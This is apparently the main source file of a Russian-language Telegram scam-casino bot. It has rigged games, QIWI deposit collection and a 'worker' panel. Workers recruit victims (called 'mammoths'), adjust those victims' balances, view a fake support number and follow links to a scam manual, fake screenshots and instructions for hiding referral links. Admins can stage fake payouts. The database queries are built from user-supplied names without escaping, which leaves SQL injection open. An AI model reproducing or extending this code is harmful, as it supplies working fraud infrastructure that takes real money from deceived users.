#!/usr/bin/python
# -*- coding: utf-8 -*-
import sqlite3
import json
import time
import logging
from casino_config import bot, admin_1, admin_2, fake_number, people, QIWI_TOKEN, QIWI_NUMBER, admin_chat, \
	manual_link, screens_bot, manual_link_2
from casino_config import get_status, get_balance, get_referals, get_ref_balance, get_ref_link, get_random_number, \
    get_inf_profil
from casino_keyboard import markup_inline_soglashenie, keyboard_osnova, \
    keyboard_admin, keyboard_worker, keyboard_vivod, deposit_btn, \
    nazad_admin, nazad_worker, keyboard_games, bet_5, keyboard_deposit_methods, \
    del_msg_button, nazad_worker, keyboard_games, bet_5
from casino_money import vivod_money_1, worker_zp, _set_bill_id, \
    _create_invoice, _top_up_balance, _reset_bill_id, _get_user_balance, \
    _get_user_bill_id
from casino_functions import admin_rassilka, chan_balance, chan_status, ins_workers, del_workers, \
    get_payment_url, get_comment, check_deposit, add_balance, add_deposit, update_deposit_amount, \
    get_deposit_amount, deposit1, check_worker, worker_rassilka, fake_payment, get_boss, get_username, \
    update_username, chan_status_worker, get_mamonts, get_top_workers, update_worker_username, \
    get_worker_username, update_first_name, get_worker
from casino_casino import play_casino
from casino_safe import play_safe
from casino_crash import play_crash
from casino_roulette import play_roulette
print("Бот запущен.")


# logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
#                     level=logging.INFO)
# logger = logging.getLogger(__name__)


# Первый старт + подключение клавиатуры

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.chat.id > 0:
        con = sqlite3.connect("dannie_2.db")
        cur = con.cursor()
        cur.execute(f"select count(*) from users where id = {message.chat.id}")
        if cur.fetchone()[0] == 0:
            con.commit()
            bot.send_message(message.from_user.id,
                             f"🎉Привет, {message.chat.first_name}!\n\n"
                             f"Политика и условия пользования данным ботом.\n"
                             f"1. Играя у нас, вы берёте все риски за свои средства на себя.\n"
                             f"2. Принимая правила, Вы подтверждаете своё совершеннолетие!\n"
                             f"3. Ваш аккаунт может быть забанен в подозрении на мошенничество/обман нашей системы!\n"
                             f"4. Мультиаккаунты запрещены!\n"
                             f"5. Скрипты, схемы использовать запрещено!\n"
                             f"6. Если будут выявлены вышеперчисленные случаи, Ваш аккаунт будет заморожен до выяснения обстоятельств!\n"
                             f"7. В случае необходимости администрация имеет право запросить у Вас документы, подтверждающие Вашу личность и Ваше совершеннолетие.\n\n"
                             f"Вы играете на виртуальные монеты, покупая их за настоящие деньги. Любое пополнение бота является пожертвованием!  Вывод денежных средств осуществляется только при достижении баланса, в 5 раз превышающего с сумму Вашего пополнения!По всем вопросам Вывода средств, по вопросам пополнения, а так же вопросам играм обогащайтесь в поддержку, указанную в описании к боту. Пишите сразу по делу, а не «Здравствуйте! Тут?»\n"
                             f"Старайтесь изложить свои мысли четко и ясно, что поддержка не мучалась и не пыталась Вас понять.\n"
                             f"Спасибо за понимание!\n"
                             f"Удачи!",
                             reply_markup=markup_inline_soglashenie)

            # Проверяем наличие босса
            ref = message.text
            if len(ref) != 6:
                try:
                    ref = int(ref[7:])
                    con = sqlite3.connect("dannie_2.db")
                    cur = con.cursor()
                    cur.execute(f"select count(*) from users where id = {ref}")
                    if cur.fetchone()[0] != 0:
                        con.commit()
                        boss = ref
                    else:
                        con.commit()
                        boss = admin_1
                except:
                    boss = admin_1
            else:
                boss = admin_1

            # Добавляем пользователю данные
            id = message.chat.id
            name = (f"{message.chat.first_name} {'|'} {message.chat.last_name}")
            status = 0
            balance = 0
            last_popolnenie = 0
            referals = 0
            ref_balance = 0
            username = message.chat.username
            con = sqlite3.connect("dannie_2.db")
            cur = con.cursor()
            cur.execute(f"INSERT INTO users (id,name,username,status,balance,last_popolnenie,referals,ref_balance,boss) "
                        f"VALUES ({id},\"{name}\",'{username}',{status},{balance},{last_popolnenie},{referals},{ref_balance},{boss})")
            con.commit()

            # Добавляем боссу + 1 реферал
            con = sqlite3.connect("dannie_2.db")
            cur = con.cursor()
            cur.execute(f"SELECT referals FROM users WHERE id = {boss}")
            referal = cur.fetchone()[0]
            referals = referal + 1
            con.commit()
            con = sqlite3.connect("dannie_2.db")
            cur = con.cursor()
            cur.execute(f"UPDATE users SET referals = {referals} WHERE id = {boss}")
            con.commit()


        else:
            con.commit()
            balance = get_balance(message)
            referals = get_referals(message)
            ref_balance = get_ref_balance(message)
            ref_link = get_ref_link(message)
            random_number = get_random_number(message)
            inf_profil = get_inf_profil(balance, referals, ref_balance, ref_link, random_number)
            bot.send_message(message.from_user.id, f"🎉Привет, {message.chat.first_name}🎉! \n\n\n{inf_profil}",
                             reply_markup=keyboard_osnova())


@bot.message_handler(commands=['top'])
def send_top(message):
    if check_worker(message.from_user.id) != None:
        top = "Топ 10 воркеров:\n"
        x = 0
        for user in get_top_workers():
            if x <= 10:
                top += f"{x+1}.  <a href='t.me/{user[3]}'>{user[4]}</a> - {user[2]} рублей - {user[1]} профитов\n"
                x += 1
            else:
                break
        bot.send_message(chat_id=message.chat.id, text=top, parse_mode="HTML", disable_web_page_preview=True)


# Работа бота
@bot.message_handler(content_types="text")
def get_text_message(message, *args):
    if message.chat.id > 0:
        # if get_user_id(message.chat.id) == None:
        # 	bot.send_message(chat_id=message.chat.id, text="Вы не приняли условия соглашения")
        # 	bot.register_next_step_handler(message, send_welcome)
        if message.chat.username != None:
            if message.chat.username != get_username(message.chat.id):
                update_username(message.chat.id, message.chat.username)
            balance = get_balance(message)
            referals = get_referals(message)
            ref_balance = get_ref_balance(message)
            ref_link = get_ref_link(message)
            random_number = get_random_number(message)
            inf_profil = get_inf_profil(balance, referals, ref_balance, ref_link, random_number)

            if message.text == "🎮Игры":
                bot.send_message(message.from_user.id, "Выберите интересующую Вас игру", reply_markup=keyboard_games())

            elif message.text == "🎰Казино":
                bot.send_message(message.from_user.id, "Отправьте любое сообщение, чтобы подтвердить, что Вы не робот")
                bot.register_next_step_handler(message, play_casino)

            elif message.text == "📈Crash":
                bot.send_message(message.from_user.id, "Отправьте любое сообщение, чтобы подтвердить, что Вы не робот")
                bot.register_next_step_handler(message, play_crash)

            elif message.text == "💰Сейф":
                bot.send_message(message.from_user.id, "Отправьте любое сообщение, чтобы подтвердить, что Вы не робот")
                bot.register_next_step_handler(message, play_safe)

            elif message.text == "🧿Рулетка":
                bot.send_message(message.from_user.id, "Отправьте любое сообщение, чтобы подтвердить, что Вы не робот")
                bot.register_next_step_handler(message, play_roulette)

            elif message.text == "💸Пополнить":
                bot.send_message(message.from_user.id, "Укажите сумму пополнения")
                bot.register_next_step_handler(message, deposit1)
            
            elif message.text == "💳Карта":
                comment = get_comment(message.from_user.id)
                if comment == None:
                    add_deposit(message.from_user.id)
                if get_deposit_amount(message.from_user.id) != None:
                    deposit_amount = get_deposit_amount(message.from_user.id)
                    bot.send_message(message.from_user.id,
                                f"Пополнение Qiwi:\n"
                                f"➖➖➖➖➖➖➖➖\n"
                                f" Номер: <code>{QIWI_NUMBER}</code>\n"
                                f" Комментарий: <code>{comment}</code>\n"
                                f" Сумма: <code>{deposit_amount}</code>₽\n"
                                f"➖➖➖➖➖➖➖➖\n\n"
                                f"⚠️ Пополнение без комментария или меньше 200р = деньги пойдут на развитие проекта! Так что сверяйте все чтобы было.\n",
                                reply_markup=deposit_btn(get_payment_url(comment, QIWI_NUMBER, deposit_amount)),
                                parse_mode='HTML')
                else:
                    bot.send_message(message.from_user.id, "Вы не указали сумму пополнения!\nУкажите сумму пополнения.Например: 500")
                    bot.register_next_step_handler(message, deposit1)
            
            elif message.text == "🥝Qiwi":
                comment = get_comment(message.from_user.id)
                if comment == None:
                    add_deposit(message.from_user.id)
                if get_deposit_amount(message.from_user.id) != None:
                    deposit_amount = get_deposit_amount(message.from_user.id)
                    bot.send_message(message.from_user.id,
                                f"Пополнение Qiwi:\n"
                                f"➖➖➖➖➖➖➖➖\n"
                                f" Номер: <code>{QIWI_NUMBER}</code>\n"
                                f" Комментарий: <code>{comment}</code>\n"
                                f" Сумма: <code>{deposit_amount}</code>₽\n"
                                f"➖➖➖➖➖➖➖➖\n\n"
                                f"⚠️ Пополнение без комментария или меньше 200р = деньги пойдут на развитие проекта! Так что сверяйте все чтобы было.\n",
                                reply_markup=deposit_btn(get_payment_url(comment, QIWI_NUMBER, deposit_amount)),
                                parse_mode='HTML')
                else:
                    bot.send_message(message.from_user.id, "Вы не указали сумму пополнения!\nУкажите сумму пополнения.Например: 500")
                    bot.register_next_step_handler(message, deposit1)
            elif message.text == "✨Вывести":
                bot.send_message(message.from_user.id, f"{inf_profil}")
                bot.send_message(message.from_user.id, "Введите сумму для вывода", reply_markup=keyboard_vivod())
                bot.register_next_step_handler(message, vivod_money_1)

            elif message.text == "👤Личный кабинет":
                bot.send_message(message.from_user.id, f"{inf_profil}")

            elif message.text == "Админ" and message.chat.id == admin_1 or message.chat.id == admin_2:
                bot.send_message(message.from_user.id, "Вы перешли в меню админа", reply_markup=keyboard_admin())
                bot.register_next_step_handler(message, get_text_message_admin)
            elif message.text == "Воркер" and check_worker(message.from_user.id) != None:
                bot.send_message(message.from_user.id, "Вы перешли в меню воркера", reply_markup=keyboard_worker())
                bot.register_next_step_handler(message, get_text_message_worker)

            elif message.text == "◀️Назад":
                bot.send_message(message.from_user.id, "🔙 Вы вернулись в главное меню", reply_markup=keyboard_osnova())
        else:
            bot.send_message(message.from_user.id, "👤Для того чтобы использовать бота установите username в настройках телеграма")
    else:
        pass


# Доступные функции админа
@bot.message_handler(content_types="text")
def get_text_message_admin(message):
    if message.chat.id > 0:
        con = sqlite3.connect("dannie_2.db")
        cur = con.cursor()
        if message.text == "Сделать рассылку":
            bot.send_message(message.from_user.id, "Введите текст рассылки")
            bot.register_next_step_handler(message, admin_rassilka)

        elif message.text == "Сделать рассылку воркерам":
            bot.send_message(message.from_user.id, "Введите текст рассылки")
            bot.register_next_step_handler(message, worker_rassilka)

        elif message.text == "Изменить баланс":
            bot.send_message(message.from_user.id, "Введите id человека, которому Вы хотите изменить баланс",
                             reply_markup=nazad_admin())
            bot.register_next_step_handler(message, chan_balance)

        elif message.text == "Изменить статус":
            bot.send_message(message.from_user.id, "Введите id человека, которому Вы хотите изменить статус",
                             reply_markup=nazad_admin())
            bot.register_next_step_handler(message, chan_status)

        elif message.text == "Добавить воркера":
            bot.send_message(message.from_user.id, "Введите id человека, которого Вы хотите сделать воркером",
                             reply_markup=nazad_admin())
            bot.register_next_step_handler(message, ins_workers)

        elif message.text == "Фейк залёт":
            bot.send_message(message.from_user.id, "Введите сумму залета",
                             reply_markup=nazad_admin())
            bot.register_next_step_handler(message, fake_payment)

        elif message.text == "Удалить воркера":
            bot.send_message(message.from_user.id, "Введите id человека, которого Вы хотите удалить из воркеров",
                             reply_markup=nazad_admin())
            bot.register_next_step_handler(message, del_workers)

        elif message.text == "Информация":
            cur.execute("SELECT COUNT(1) FROM users")
            users = cur.fetchone()
            cur.execute("SELECT COUNT(1) FROM workers")
            workers = cur.fetchone()
            bot.send_message(message.from_user.id, f"Число пользователей: {users[0]}\n"
                                                   f"Число воркеров: {workers[0]}\n"
                                                   f"Фейковый номер: {fake_number}")
            bot.register_next_step_handler(message, get_text_message_admin)

        elif message.text == "Выйти":
            bot.send_message(message.from_user.id, "Вы покинули меню админа", reply_markup=keyboard_osnova())


# Доступные функции воркера
@bot.message_handler(content_types="text")
def get_text_message_worker(message):
    if message.chat.id > 0:
        if check_worker(message.from_user.id) != None:
            if message.chat.username != get_worker_username(message.from_user.id):
                update_worker_username(message.from_user.id, message.from_user.username)

            if get_worker(message.from_user.id)[4] != message.from_user.first_name:
                update_first_name(message.from_user.id, message.from_user.first_name)
            con = sqlite3.connect("dannie_2.db")
            cur = con.cursor()
            balance = get_balance(message)
            referals = get_referals(message)
            ref_balance = get_ref_balance(message)
            ref_link = get_ref_link(message)
            random_number = get_random_number(message)
            inf_profil = get_inf_profil(balance, referals, ref_balance, ref_link, random_number)

            if message.text == "Изменить баланс":
                text = "Ваши мамонты:\n\n" + get_mamonts(message.chat.id)
                bot.send_message(message.from_user.id, text)
                bot.send_message(message.from_user.id, "Введите id человека, которому Вы хотите изменить баланс",
                                 reply_markup=nazad_worker())
                bot.register_next_step_handler(message, chan_balance)

            elif message.text == "Изменить статус":
                text = "Ваши мамонты:\n\n" + get_mamonts(message.chat.id)
                bot.send_message(message.from_user.id, text) 
                bot.send_message(message.from_user.id, "Введите id человека, которому Вы хотите изменить статус",
                                 reply_markup=nazad_worker())
                bot.register_next_step_handler(message, chan_status_worker)
            
            elif message.text == "Информация":
                bot.send_message(message.from_user.id,
                                                    f"📞Фейковый номер: {fake_number}\n\n"
                                                    f"📚Мануал для работы:  <a href='{manual_link}'>ССЫЛКА</a>\n\n"
                                                    f"📷Скрины для убедительности: <a href='t.me:/{screens_bot}'>ССЫЛКА</a>\n\n"
                                                    f"📎Как спрятать рефку: <a href='{manual_link_2}'>ССЫЛКА</a>\n\n"
                                                    f"⚠️Обязательно приглашайте мамонтов по реф. ссылке иначе выплаты не будет" , parse_mode="HTML", disable_web_page_preview=True)
                bot.register_next_step_handler(message, get_text_message_worker)

            elif message.text == "Профиль":
                worker = get_worker(message.chat.id)
                bot.send_message(message.from_user.id, 
                                    f"<b>👤Ваш профиль:\n\n"
                                    f"ID: <code>{message.chat.id}</code>\n"
                                    f"Логин: <code>{message.chat.username}</code>\n\n"
                                    f"Реферальная ссылка:\n{get_ref_link(message)}\n\n"
                                    f"💫Количество профитов {worker[1]} на сумму {worker[2]} рублей\n</b>",
                                    parse_mode="HTML")
                bot.register_next_step_handler(message, get_text_message_worker)

            elif message.text == "Выйти":
                bot.send_message(message.from_user.id, "Вы покинули меню воркера", reply_markup=keyboard_osnova())
        else:
            bot.send_message(message.from_user.id, "Вы перешли меню", reply_markup=keyboard_osnova())

if __name__ == '__main__':
    bot.infinity_polling(timeout=10, long_polling_timeout = 5)
